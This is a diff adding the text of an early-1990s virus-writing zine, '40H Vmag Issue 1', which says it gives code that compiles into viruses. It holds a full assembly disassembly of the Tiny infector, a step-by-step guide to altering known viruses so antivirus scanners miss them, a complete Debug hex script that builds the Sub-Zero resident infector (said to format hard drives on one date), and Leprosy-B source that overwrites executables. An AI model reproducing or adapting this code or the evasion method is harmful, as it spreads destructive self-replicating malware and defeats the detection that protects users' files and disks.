@@ -1,0 +1,1040 @@
+40H Vmag Issue 1 Volume 1                                               00000
+
+Introduction -
+
+This is a down and dirty zine on wich gives examples on writing viruses
+and this magazines contains code that can be compiled to viruses.
+
+If you are an anti-virus pussy, who is just scared that your hard disk will
+get erased so you have a psycological problem with viruses, erase these
+files.  This aint for you.
+
+
+                                 INDEX
+
+
+001...........................Virus Spotlight, The Tiny virus
+002...........................How to modify viruses to avoid SCAN
+003...........................Sub-Zero virus
+004...........................Simple encryption techniques and Leprosy-B
+005...........................1992 virus
+
+Staff -
+
+        Editior, Technical Consultant - Hellraiser
+        Co-Editor, Theory Consultant  - Bionic Slasher
+
+
+
+
+40H Vmag Issue 1 Volume 1                                               00001
+
+
+                          - VIRUS SPOTLIGHT -
+
+
+     The first virus I would like to spotlight is the Tiny virus, lets see
+what our good friend Patti Hoffman (bitch) has written about it.
+
+ Name:        Tiny
+ Aliases:     163 COM Virus, Tiny 163 Virus, Kennedy-163
+ V Status:    Rare
+ Discovery:   June, 1990
+ Symptoms:    COMMAND.COM & .COM file growth
+ Origin:      Denmark
+ Eff Length:  163 Bytes
+ Type Code:   PNCK - Parasitic Non-Resident .COM Infector
+ Detection Method:  ViruScan V64+, VirexPC, F-Prot 1.12+, NAV, IBM Scan 2.00+
+ Removal Instructions: Scan/D, F-Prot 1.12+, or Delete infectedfiles
+ General Comments:
+       The 163 COM Virus, or Tiny Virus, was isolated by Fridrik Skulason
+       of Iceland in June 1990.  This virus is a non-resident generic
+       .COM file infector, and it will infect COMMAND.COM.
+
+       The first time a file infected with the 163 COM Virus is executed,
+       the virus will attempt to infect the first .COM file in the
+       current directory.  On bootable diskettes, this file will normally
+       be COMMAND.COM.  After the first .COM file is infected,each time
+       an infected program is executed another .COM file will attempt to
+       be infected.  Files are infected only if their original length is
+       greater than approximately 1K bytes.
+
+       Infected .COM files will increase in length by 163 bytes, and have
+       date/time stamps in the directory changed to the date/time the
+       infection occurred.  Infected files will also always end with this
+       hex string: '2A2E434F4D00'.
+
+       This virus currently does nothing but replicate, and is the
+       smallest MS-DOS virus known as of its isolation date.
+
+       The Tiny Virus may or may not be related to the Tiny Family.
+       ^like she'd know the difference!
+
+OK, Theres the run down on the smallest MS-DOS virus known to man.  As for
+it being detected by SCAN we'll see about that.
+
+Here is a dissasembly of the virus, It can be assembled under Turbo Assembler
+or MASM.
+
+-----------------------------------------------------------------------------
+
+PAGE  59,132
+
+
+data_2e         equ     1ABh                    ;start of virus
+
+seg_a           segment byte public             ;
+                assume  cs:seg_a, ds:seg_a      ;assume cs, ds - code
+
+
+                org     100h                    ;orgin of all COM files
+s               proc    far
+
+start:
+                jmp     loc_1                   ;jump to virus
+
+
+;this is a replacement for an infected file
+
+                db      0CDh, 20h, 7, 8, 9      ;int 20h
+                                                ;pop es
+
+loc_1:
+                call    sub_1                   ;
+
+
+
+s               endp
+
+
+sub_1           proc    near                    ;
+                pop     si                      ;locate all virus code via
+                sub     si,10Bh                 ;si, cause all offsets will
+                mov     bp,data_1[si]           ;change when virus infects
+                add     bp,103h                 ;a COM file
+                lea     dx,[si+1A2h]            ;offset of '*.COM',0 - via SI
+                xor     cx,cx                   ;clear cx - find only normal
+                                                ;attributes
+                mov     ah,4Eh                  ;find first file
+loc_2:
+                int     21h                     ;
+
+                jc      loc_6                   ;no files found? then quit
+                mov     dx,9Eh                  ;offset of filename found
+                mov     ax,3D02h                ;open file for read/write access
+                int     21h                     ;
+
+                mov     bx,ax                   ;save handle into bx
+                mov     ah,3Fh                  ;read from file
+                lea     dx,[si+1A8h]            ;offset of save buffer
+                mov     di,dx                   ;
+                mov     cx,3                    ;read three bytes
+                int     21h                     ;
+                
+                cmp     byte ptr [di],0E9h      ;compare buffer to virus id
+                                                ;string
+                je      loc_4                   ;
+loc_3:
+                mov     ah,4Fh                  ;find the next file
+                jmp     short loc_2             ;and test it
+loc_4:
+                mov     dx,[di+1]               ;lsh of offset
+                mov     data_1[si],dx           ;
+                xor     cx,cx                   ;msh of offset
+                mov     ax,4200h                ;set the file pointer
+                int     21h                     ;
+
+                mov     dx,di                   ;buffer to save read
+                mov     cx,2                    ;read two bytes
+                mov     ah,3Fh                  ;read from file
+                int     21h                     ;
+
+                cmp     word ptr [di],807h      ;compare buffer to virus id
+                je      loc_3                   ;same? then find another file
+
+;heres where we infect a file
+
+                xor     dx,dx                   ;set file pointer
+                xor     cx,cx                   ;ditto
+                mov     ax,4202h                ;set file pointer
+                int     21h                     ;
+
+                cmp     dx,0                    ;returns msh
+                jne     loc_3                   ;not the same? find another file
+                cmp     ah,0FEh                 ;lsh = 254???
+                jae     loc_3                   ;if more or equal find another file
+
+                mov     ds:data_2e[si],ax       ;point to data
+                mov     ah,40h                  ;write to file
+                lea     dx,[si+105h]            ;segment:offset of write buffer
+                mov     cx,0A3h                 ;write 163 bytes
+                int     21h                     ;
+
+                jc      loc_5                   ;error? then quit
+                mov     ax,4200h                ;set file pointer
+                xor     cx,cx                   ;to the top of the file
+                mov     dx,1                    ;
+                int     21h                     ;
+
+                mov     ah,40h                  ;write to file
+                lea     dx,[si+1ABh]            ;offset of jump to virus code
+                mov     cx,2                    ;two bytes
+                int     21h                     ;
+
+;now close the file
+
+loc_5:
+                mov     ah,3Eh                  ;close file
+                int     21h                     ;
+
+loc_6:
+                jmp     bp                      ;jump to original file
+
+data_1          dw      0                       ;
+                db      '*.COM',0               ;wild card search string
+
+
+sub_1           endp
+seg_a           ends
+                end     start
+
+
+-----------------------------------------------------------------------------
+
+Its good to start off with a simple example like this.  As you can see
+what the virus does is use the DOS 4Eh function to find the firsy COM file
+in the directory.  If no files are found the program exits.  If a file is
+found it compares the virus id string (the virus jump instruction) to the
+first two bytes of the COM file.  If they match the program terminates.
+If they don't match the virus will infect the file.  Using two key MS-DOS
+functions to infect.
+
+The first -
+
+INT 21h Function 42h
+SET FILE POINTER
+
+AH   =   42h
+AL   =   method code
+BX   =   file handle
+CX   =   most significant half to offset
+DX   =   least "                       "
+
+If there is an error in executing this function the carry flag will be set,
+and AX will contian the error code.  If no error is encountered
+
+DX   =   most significant half of file pointer
+AX   =   least "                             "
+
+
+The second (and most) important function used by any virus is
+
+
+INT 21h Function 40h
+WRITE TO FILE OR DEVICE
+
+AH    =   40h
+BX    =   handle
+CX    =   number of bytes to write
+DS:DX =   segment of buffer
+
+Returns
+
+AX    =   bytes transferred
+
+on error
+
+AX    =  Error Code and flag is set.
+
+
+An example of Function 40h is ----
+
+
+     mov     ah,40h                   ;set function
+     mov     bx,handle                ;load bx with handle from prev open
+     mov     cx,virus_size            ;load cx with # of bytes to write
+     mov     dx,offset write_buffer   ;load dx with the offset of what to
+                                      ;write to file
+     int     21h                      ;
+
+
+This function is used by 98% of all MS-DOS viruses to copy itself to a
+victim file.
+
+
+Now heres a sample project -  create a new strain of Tiny, have it restore
+the original date and time etc...
+
+                                                                          HR
+40H Vmag Issue 1 Volume 1                                               00002
+
+             -  HOW TO MODIFY A VIRUS SO SCAN WON'T CATCH IT -
+                                   OR
+                     HOW TO CREATE NEW VIRUS STRAINS
+
+
+The problem with most viruses is that this dickhead who lives in California
+named John Mcafee gets his greedy hands on them and turns them into big
+bucks -- for him.   John boy is the reason there are over 500 viruses out
+there, and I wouldn't doubt if he weren't resposible for  writing at least
+ten of them.
+
+So the best thing to do to some Mcafee dependant sucker, or lame board is
+this.
+
+Say you have a copy of a played out virus, lets say an older one like
+Armstand or Jerusalem.  Almost every virus scanner can detect these
+viruses cause they been around so long.  Now heres a quick way to modify
+viruses so the scanners wont catch them, in turn making them new strains.
+
+The tools you need are --
+
+                          Norton Utilites
+                          Debug          and/or
+                          Turbo Debugger by Borland
+
+Now heres what you do.
+
+Step A
+------
+
+Make a target file like this with Debug
+
+Copy the below file with your editor to a file called SAMPLE.USR
+
+-------------------------------------------------------------------------------
+n sample.com
+a
+int 20
+
+rcx
+2
+w
+q
+------------------------------------------------------------------------------
+Then uses Debug to make the file SAMPLE.COM executing this command --
+
+DEBUG < SAMPLE.USR
+
+This will make a two byte called SAMPLE.COM
+
+
+STEP B
+------
+
+Infect the file with the virus.  If this is a boot sector virus your on
+your own.  Do whatever you have to to infect the two byte file.
+
+
+Make a copy of the file and keep it for safe keeping.
+
+STEP C
+------
+
+Load up DISKEDIT, which comes with Norton 6.0 (I'm not sure if its in the
+lower versions) PCTOOLS Hex Editor will work too but it takes more work.
+
+Now have DISKEDIT Hex-edit the infected file.
+
+Now figure out where the middle of the file is.  Next put block on and
+go to the end of the file.  At the end of the file go to the edit screen and
+select fill.  Fill the lower half of the file will nonsense characters, its
+good to select 255d (FFh) the blank character.
+
+Now save your changes and go to DOS
+
+Now use SCAN to scan the file for viruses.  If it detects the virus you
+didnt delete the search string that SCAN is searching for.  Get it???
+
+You see all SCAN does is search files for strings that are related to viruses.
+For example if SCAN was looking for CASCADE it look for something like this-
+
+                        EB1DAD1273D1FF121F
+
+
+In every file you specify.  So what we are doing is narrowing down where that
+string is in the virus that SCAN keeps finding.
+
+So what you have to do is keep deleting parts of the virus with DISKEDIT
+untill you finally narrow down the string.
+
+Keep this in mind, search strings are in the first 150 bytes of the file
+about 75% of the time.
+
+Ok lets say you narrowed down the search string and lets say it's -
+
+                      B8 92 19 B7 21 CD
+
+It will most likly be longer but this an example.
+
+Now back to DEBUG - Do the following--
+
+DEBUG
+
+E 0100 b8 92 19 b7 21 cd    -- this is the string you found
+
+Then type --
+
+U
+
+This will give you a unassembled look at what the id-string is.  In this
+example it was
+
+
+                       mov  ax,1992h
+                       mov  bx,21h
+                       int  21h
+
+
+Now this is what you have to do, and keep in mind the following ---
+
+THE FOLLOWING TAKES A SOMEWHAT KNOWING OF ASSEMBLER AND HOW IT WORKS!!!!!!
+
+Uses Turbo Debugger to find the string, you can use DEBUG but I don't know
+how to do this from debug.
+
+Ok say you got the string on the screen --
+
+                       mov  ax,1992h
+                       mov  bh,21h
+                       int  21h
+
+Write down the locations in the file where these strings are.  Ex 0100h etc..
+
+Now rearrange the AX mov with the BX mov like this ---
+
+                        mov bh,21h
+                        mov ax,1992h
+                        int 21h
+
+You see?  You didn't change the way the code functions (THATS IF YOU KNOW
+WHAT YOUR DOING!) but you changed the codes id-string for SCAN.
+
+Now since Turbo Debugger dosent let you save the changes you must do it
+via - Debug.
+
+DEBUG virus.com
+
+a 0122  - This is the address of the string
+
+Now enter the assembler instructions --
+
+                         mov bh,21
+                         mov ax,1992h
+                         int 21h
+
+w
+
+q
+
+Save it and SCAN it, if SCAN doesn't catch it Congrats.  If it does ---
+back to the lab.  Oh well you get the point.
+
+One warning, this only works with un-encrypting viruses, or on the
+encryption mechanism of encrypting files (which will most likely be Scanned).
+
+With that in mind, have fun.
+
+                                                                           HR
+40H Vmag Issue 1 Volume 1                                               00003
+
+                           - SUB-ZERO VIRUS -
+
+
+
+    Heres one for all of you who don't have an assembler.  It can be
+compiled using debug by naming the insert below SUB-ZERO.USR and
+executing the command -
+
+                        DEBUG < SUB-ZERO.USR
+
+------------------------------------------------------------------------------
+n sub-zero.com
+e 0100  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
+e 0110  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
+e 0120  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
+e 0130  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
+e 0140  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
+e 0150  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
+e 0160  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
+e 0170  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
+e 0180  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
+e 0190  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
+e 01A0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
+e 01B0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
+e 01C0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
+e 01D0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
+e 01E0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
+e 01F0  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
+e 0200  00 2E FF 2E 47 00 33 C0 8E C0 8B 89 31 DB 2E A3
+e 0210  4B 00 26 A0 FE 03 2E A2 4D 00 26 C7 06 FC 03 F3
+e 0220  A5 26 C6 06 FE 03 CB 58 04 10 90 8E C0 0E 1F B9
+e 0230  00 03 B1 88 33 F6 8B FE 06 B8 42 01 50 EA FC 03
+e 0240  00 00 8C C8 8E D0 BC 00 07 33 C0 8E D8 2E A1 4B
+e 0250  00 A3 FC 03 2E A0 4D 00 A2 FE 03 8B DC B1 04 D3
+e 0260  EB 83 C3 10 2E 89 1E 33 00 B4 4A 2E 8E 06 31 00
+e 0270  CD 21 B8 21 35 CD 21 2E 89 1E 17 00 2E 8C 06 19
+e 0280  00 0E 1F BA 5B 02 B8 21 25 CD 21 8E 06 31 00 26
+e 0290  8E 06 2C 00 33 FF B9 FF 7F 32 C0 F2 AE 26 38 05
+e 02A0  E0 F9 8B D7 83 C2 03 B8 00 4B 06 1F 0E 07 BB 35
+e 02B0  00 52 51 53 50 06 1E B4 2A CD 21 2E C6 06 0E 00
+e 02C0  00 81 F9 C6 07 74 30 3C 05 75 0D 80 FA 17 72 08
+e 02D0  2E FE 06 0E 00 EB 20 90 B8 08 35 CD 21 2E 89 1E
+e 02E0  13 00 2E 8C 06 15 00 0E 1F C7 06 1F 00 48 3F B8
+e 02F0  08 25 BA 1E 02 CD 21 1F 07 58 5B 59 5A 9C 2E FF
+e 0300  1E 17 00 1E 07 B4 49 CD 21 B4 4D CD 21 B4 31 BA
+e 0310  00 06 B1 04 D3 EA 83 C2 10 CD 21 32 C0 CF 2E 83
+e 0320  3E 1F 00 09 75 17 52 51 50 B4 2A CD 21 81 FA 06
+e 0330  06 75 07 B8 01 07 B2 80 CD 13 58 59 5A 2E 83 2E
+e 0340  1F 00 01 EB 11 20 20 53 75 62 2D 5A 65 72 6F 20
+e 0350  4E 59 48 43 20 20 2E FF 2E 13 00 9C 80 FC E0 75
+e 0360  05 B8 00 03 9D CF 80 FC DE 74 2D 80 FC DD 74 0E
+e 0370  3D 00 4B 75 03 E9 B4 00 9D 2E FF 2E 17 00 58 58
+e 0380  B8 00 01 2E A3 0A 00 58 2E A3 0C 00 F3 A4 9D 2E
+e 0390  A1 0F 00 2E FF 2E 0A 00 83 C4 06 9D 8C C8 8E D0
+e 03A0  BC 10 07 06 06 33 FF 0E 07 B9 10 00 8B F3 BF 21
+e 03B0  00 F3 A4 8C D8 8E C0 2E F7 26 7A 00 2E 03 06 2B
+e 03C0  00 83 D2 00 2E F7 36 7A 00 8E D8 8B F2 8B FA 8C
+e 03D0  C5 2E 8B 1E 2F 00 0B DB 74 13 B9 00 80 F3 A5 05
+e 03E0  00 10 81 C5 00 10 8E D8 8E C5 4B 75 ED 2E 8B 0E
+e 03F0  2D 00 F3 A4 58 50 05 10 00 2E 01 06 29 00 2E 01
+e 0400  06 25 00 2E A1 21 00 1F 07 2E 8E 16 29 00 2E 8B
+e 0410  26 27 00 2E FF 2E 23 00 33 C9 B8 01 43 CD 21 B4
+e 0420  3C CD 21 B8 00 4B 9D 2E FF 2E 17 00 2E 80 3E 0E
+e 0430  00 01 74 E4 2E C7 06 70 00 FF FF 2E C7 06 8F 00
+e 0440  00 00 2E 89 16 80 00 2E 8C 1E 82 00 50 53 51 52
+e 0450  56 57 1E 06 FC 8B FA 32 D2 80 7D 01 3A 75 05 8A
+e 0460  15 80 E2 1F B4 36 CD 21 3D FF FF 75 03 E9 77 02
+e 0470  F7 E3 F7 E1 0B D2 75 05 3D 10 07 72 F0 2E 8B 16
+e 0480  80 00 1E 07 32 C0 B9 41 00 F2 AE 2E 8B 36 80 00
+e 0490  8A 04 0A C0 74 0E 3C 61 72 07 3C 7A 77 03 80 2C
+e 04A0  20 46 EB EC B9 0B 00 2B F1 BF 84 00 0E 07 B9 0B
+e 04B0  00 F3 A6 75 03 E9 2F 02 B8 00 43 CD 21 72 05 2E
+e 04C0  89 0E 72 00 72 25 32 C0 2E A2 4E 00 1E 07 8B FA
+e 04D0  B9 41 00 F2 AE 80 7D FE 4D 74 0B 80 7D FE 6D 74
+e 04E0  05 2E FE 06 4E 00 B8 00 3D CD 21 72 5A 2E A3 70
+e 04F0  00 8B D8 B8 02 42 B9 FF FF BA FB FF CD 21 72 EB
+e 0500  05 05 00 2E A3 11 00 B9 05 00 BA 6B 00 8C C8 8E
+e 0510  D8 8E C0 B4 3F CD 21 8B FA BE 05 00 F3 A6 75 07
+e 0520  B4 3E CD 21 E9 C0 01 B8 24 35 CD 21 89 1E 1B 00
+e 0530  8C 06 1D 00 BA 1B 02 B8 24 25 CD 21 C5 16 80 00
+e 0540  33 C9 B8 01 43 CD 21 72 3B 2E 8B 1E 70 00 B4 3E
+e 0550  CD 21 2E C7 06 70 00 FF FF B8 02 3D CD 21 72 24
+e 0560  2E A3 70 00 8C C8 8E D8 8E C0 8B 1E 70 00 B8 00
+e 0570  57 CD 21 89 16 74 00 89 0E 76 00 B8 00 42 33 C9
+e 0580  8B D1 CD 21 72 3D 80 3E 4E 00 00 74 03 EB 57 90
+e 0590  BB 00 10 B4 48 CD 21 73 0B B4 3E 8B 1E 70 00 CD
+e 05A0  21 E9 43 01 FF 06 8F 00 8E C0 33 F6 8B FE B9 10
+e 05B0  07 F3 A4 8B D7 8B 0E 11 00 8B 1E 70 00 06 1F B4
+e 05C0  3F CD 21 72 1C 03 F9 33 C9 8B D1 B8 00 42 CD 21
+e 05D0  BE 05 00 B9 05 00 F3 2E A4 8B CF 33 D2 B4 40 CD
+e 05E0  21 72 0D E9 BC 00 B9 1C 00 BA 4F 00 B4 3F CD 21
+e 05F0  72 4A C7 06 61 00 84 19 A1 5D 00 A3 45 00 A1 5F
+e 0600  00 A3 43 00 A1 63 00 A3 47 00 A1 65 00 A3 49 00
+e 0610  A1 53 00 83 3E 51 00 00 74 01 48 F7 26 78 00 03
+e 0620  06 51 00 83 D2 00 05 0F 00 83 D2 00 25 F0 FF A3
+e 0630  7C 00 89 16 7E 00 05 10 07 83 D2 00 72 3A F7 36
+e 0640  78 00 0B D2 74 01 40 A3 53 00 89 16 51 00 A1 7C
+e 0650  00 8B 16 7E 00 F7 36 7A 00 2B 06 57 00 A3 65 00
+e 0660  C7 06 63 00 C5 00 A3 5D 00 C7 06 5F 00 10 07 33
+e 0670  C9 8B D1 B8 00 42 CD 21 72 0A B9 1C 00 BA 4F 00
+e 0680  B4 40 CD 21 72 11 3B C1 75 18 8B 16 7C 00 8B 0E
+e 0690  7E 00 B8 00 42 CD 21 72 09 33 D2 B9 10 07 B4 40
+e 06A0  CD 21 2E 83 3E 8F 00 00 74 04 B4 49 CD 21 2E 83
+e 06B0  3E 70 00 FF 74 31 2E 8B 1E 70 00 2E 8B 16 74 00
+e 06C0  2E 8B 0E 76 00 B8 01 57 CD 21 B4 3E CD 21 2E C5
+e 06D0  16 80 00 2E 8B 0E 72 00 B8 01 43 CD 21 2E C5 16
+e 06E0  1B 00 B8 24 25 CD 21 07 1F 5F 5E 5A 59 5B 58 9D
+e 06F0  2E FF 2E 17 00 00 00 00 00 00 00 00 00 00 00 00
+e 0700  4D 9F 19 00 10 00 00 00 45 44 00 45 4C 00 00 00
+e 0710  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
+e 0720  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
+e 0730  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
+e 0740  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
+e 0750  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
+e 0760  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
+e 0770  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
+e 0780  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
+e 0790  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
+e 07A0  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
+e 07B0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
+e 07C0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
+e 07D0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
+e 07E0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
+e 07F0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
+e 0800  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
+e 0810  CD 20 A3 AA D4 3A A3 1A 1A 1A 1A 1A 1A 1A 1A 1A
+
+rcx
+717
+w
+q
+------------------------------------------------------------------------------
+
+Sub-Zero is a memory resident COM and EXE infector that is based somewhat on
+on Jerusalem-B.  It is the ansestor to the virus Captian Trips
+which at this time has not been nailed by SCAN.
+
+Be carefull because this virus will most likly format you hard drive if you
+run it on the wrong day.  One day of the year it will perform a HD format.
+I think it's in June, hmmmm...  D-Day rings a bell.
+
+As of Scan-77 this virus can not be detected by SCAN or F-Prot.
+
+                                                                           HR
+40H Vmag Issue 1 Volume 1                                               00004
+
+                     - SIMPLE ENCRYPTION METHODS -
+
+
+    Encryption is perhaps one of the key parts of writing a virus.  If you
+have a virus that prints a message to the screen, you don't want infected
+files to contain that message.
+
+    One easy way to encrypt data is the XOR method.  XOR is a matamatical
+function that can be used to cifer and decifer data with the same key.
+
+Example --
+
+              FF  xor  A1  =  5E
+byte to encrypt^       ^key   ^result
+
+and likewise
+
+              5E  xor  A1  =  FF
+
+So as you can see an easy way to encrypt/decrypt sensitve data is with the
+XOR function.
+
+A popular virus that demonstrates this teqnique is Leprosy-B.  By studing the
+below example you are on the way to make simple encrypted viruses.
+
+------------------------------------------------------------------------------
+
+;  <LEPROSYB.ASM>   -   Leprosy-B Virus Source
+;                       Copy-ya-right (c) 1990 by PCM2.
+;
+;  This file is the source code to the Leprosy-B virus.  It should
+;  be assembled with an MASM-compatible assembler; it has been tested
+;  and assembles correctly with both MASM 4.0 and Turbo Assembler 1.0.
+;  It should be made into a .COM file before executing, with either
+;  the "/t" command line flag in TLINK or Microsoft's EXE2BIN utility.
+;
+;  This program has the potential to permanently destroy executable
+;  images on any disk medium.  Other modifications may have been made
+;  subsequent to the original release by the author, either benign,
+;  or which could result in further harm should this program be run.
+;  In any case, the author assumes no responsibility for any damage
+;  caused by this program, incidental or otherwise.  As a precaution,
+;  this program should not be turned over to irresponsible hands...
+;  (unlike people like us, that is).
+
+
+                title   "Leprosy-B Virus by PCM2, August 1990"
+
+cr              equ     13              ;  Carriage return ASCII code
+lf              equ     10              ;  Linefeed ASCII code
+tab             equ     9               ;  Tab ASCII code
+virus_size      equ     666             ;  Size of the virus file
+code_start      equ     100h            ;  Address right after PSP in memory
+dta             equ     80h             ;  Addr of default disk transfer area
+datestamp       equ     24              ;  Offset in DTA of file's date stamp
+timestamp       equ     22              ;  Offset in DTA of file's time stamp
+filename        equ     30              ;  Offset in DTA of ASCIIZ filename
+attribute       equ     21              ;  Offset in DTA of file attribute
+
+
+        code    segment 'code'          ;  Open code segment
+        assume  cs:code,ds:code         ;  One segment for both code & data
+                org     code_start      ;  Start code image after PSP
+
+;---------------------------------------------------------------------
+;  All executable code is contained in boundaries of procedure "main".
+;  The following code, until the start of "virus_code", is the non-
+;  encrypted CMT portion of the code to load up the real program.
+;---------------------------------------------------------------------
+main    proc    near                    ;  Code execution begins here
+        call    encrypt_decrypt         ;  Decrypt the real virus code
+        jmp     random_mutation         ;  Put the virus into action
+
+encrypt_val     db      00h             ;  Hold value to encrypt by here
+
+; ----------  Encrypt, save, and restore the virus code  -----------
+infect_file:
+        mov     bx,handle               ;  Get the handle
+        push    bx                      ;  Save it on the stack
+        call    encrypt_decrypt         ;  Encrypt most of the code
+        pop     bx                      ;  Get back the handle
+        mov     cx,virus_size           ;  Total number of bytes to write
+        mov     dx,code_start           ;  Buffer where code starts in memory
+        mov     ah,40h                  ;  DOS write-to-handle service
+        int     21h                     ;  Write the virus code into the file
+        call    encrypt_decrypt         ;  Restore the code as it was
+        ret                             ;  Go back to where you came from
+
+; ---------------  Encrypt or decrypt the virus code  ----------------
+encrypt_decrypt:
+        mov     bx,offset virus_code    ;  Get address to start encrypt/decrypt
+xor_loop:                               ;  Start cycle here
+        mov     ah,[bx]                 ;  Get the current byte
+        xor     ah,encrypt_val          ;  Engage/disengage XOR scheme on it
+        mov     [bx],ah                 ;  Put it back where we got it
+        inc     bx                      ;  Move BX ahead a byte
+        cmp     bx,offset virus_code+virus_size  ;  Are we at the end?
+        jle     xor_loop                ;  If not, do another cycle
+        ret                             ;  and go back where we came from
+
+;-----------------------------------------------------------------------
+;   The rest of the code from here on remains encrypted until run-time,
+;   using a fundamental XOR technique that changes via CMT.
+;-----------------------------------------------------------------------
+virus_code:
+
+;----------------------------------------------------------------------------
+;  All strings are kept here in the file, and automatically encrypted.
+;  Please don't be a lamer and change the strings and say you wrote a virus.
+;  Because of Cybernetic Mutation Technology(tm), the CRC of this file often
+;  changes, even when the strings stay the same.
+;----------------------------------------------------------------------------
+exe_filespec    db      "*.EXE",0
+com_filespec    db      "*.COM",0
+newdir          db      "..",0
+fake_msg        db      cr,lf,"Program too big to fit in memory$"
+virus_msg1      db      cr,lf,tab,"ATTENTION!  Your computer has been afflicted with$"
+virus_msg2      db      cr,lf,tab,"the incurable decay that is the fate wrought by$"
+virus_msg3      db      cr,lf,tab,"Leprosy Strain B, a virus employing Cybernetic$"
+virus_msg4      db      cr,lf,tab,"Mutation Technology(tm) and invented by PCM2 08/90.$"
+compare_buf     db      20 dup (?)      ;  Buffer to compare files in
+files_found     db      ?
+files_infected  db      ?
+orig_time       dw      ?
+orig_date       dw      ?
+orig_attr       dw      ?
+handle          dw      ?
+success         db      ?
+
+random_mutation:                        ; First decide if virus is to mutate
+        mov     ah,2ch                  ; Set up DOS function to get time
+        int     21h
+        cmp     encrypt_val,0           ; Is this a first-run virus copy?
+        je      install_val             ; If so, install whatever you get.
+        cmp     dh,15                   ; Is it less than 16 seconds?
+        jg      find_extension          ; If not, don't mutate this time
+install_val:
+        cmp     dl,0                    ; Will we be encrypting using zero?
+        je      random_mutation         ; If so, get a new value.
+        mov     encrypt_val,dl          ; Otherwise, save the new value
+find_extension:                         ; Locate file w/ valid extension
+        mov     files_found,0           ; Count infected files found
+        mov     files_infected,4        ; BX counts file infected so far
+        mov     success,0
+find_exe:
+        mov     cx,00100111b            ; Look for all flat file attributes
+        mov     dx,offset exe_filespec  ; Check for .EXE extension first
+        mov     ah,4eh                  ; Call DOS find first service
+        int     21h
+        cmp     ax,12h                  ; Are no files found?
+        je      find_com                ; If not, nothing more to do
+        call    find_healthy            ; Otherwise, try to find healthy .EXE
+find_com:
+        mov     cx,00100111b            ; Look for all flat file attributes
+        mov     dx,offset com_filespec  ; Check for .COM extension now
+        mov     ah,4eh                  ; Call DOS find first service
+        int     21h
+        cmp     ax,12h                  ; Are no files found?
+        je      chdir                   ; If not, step back a directory
+        call    find_healthy            ; Otherwise, try to find healthy .COM
+chdir:                                  ; Routine to step back one level
+        mov     dx,offset newdir        ; Load DX with address of pathname
+        mov     ah,3bh                  ; Change directory DOS service
+        int     21h
+        dec     files_infected          ; This counts as infecting a file
+        jnz     find_exe                ; If we're still rolling, find another
+        jmp     exit_virus              ; Otherwise let's pack it up
+find_healthy:
+        mov     bx,dta                  ; Point BX to address of DTA
+        mov     ax,[bx]+attribute       ; Get the current file's attribute
+        mov     orig_attr,ax            ; Save it
+        mov     ax,[bx]+timestamp       ; Get the current file's time stamp
+        mov     orig_time,ax            ; Save it
+        mov     ax,[bx]+datestamp       ; Get the current file's data stamp
+        mov     orig_date,ax            ; Save it
+        mov     dx,dta+filename         ; Get the filename to change attribute
+        mov     cx,0                    ; Clear all attribute bytes
+        mov     al,1                    ; Set attribute sub-function
+        mov     ah,43h                  ; Call DOS service to do it
+        int     21h
+        mov     al,2                    ; Set up to open handle for read/write
+        mov     ah,3dh                  ; Open file handle DOS service
+        int     21h
+        mov     handle,ax               ; Save the file handle
+        mov     bx,ax                   ; Transfer the handle to BX for read
+        mov     cx,20                   ; Read in the top 20 bytes of file
+        mov     dx,offset compare_buf   ; Use the small buffer up top
+        mov     ah,3fh                  ; DOS read-from-handle service
+        int     21h
+        mov     bx,offset compare_buf   ; Adjust the encryption value
+        mov     ah,encrypt_val          ; for accurate comparison
+        mov     [bx+6],ah
+        mov     si,code_start           ; One array to compare is this file
+        mov     di,offset compare_buf   ; The other array is the buffer
+        mov     ax,ds                   ; Transfer the DS register...
+        mov     es,ax                   ; ...to the ES register
+        cld
+        repe    cmpsb                   ; Compare the buffer to the virus
+        jne     healthy                 ; If different, the file is healthy!
+        call    close_file              ; Close it up otherwise
+        inc     files_found             ; Chalk up another fucked up file
+continue_search:
+        mov     ah,4fh                  ; Find next DOS function
+        int     21h                     ; Try to find another same type file
+        cmp     ax,12h                  ; Are there any more files?
+        je      no_more_found           ; If not, get outta here
+        jmp     find_healthy            ; If so, try the process on this one!
+no_more_found:
+        ret                             ; Go back to where we came from
+healthy:
+        mov     bx,handle               ; Get the file handle
+        mov     ah,3eh                  ; Close it for now
+        int     21h
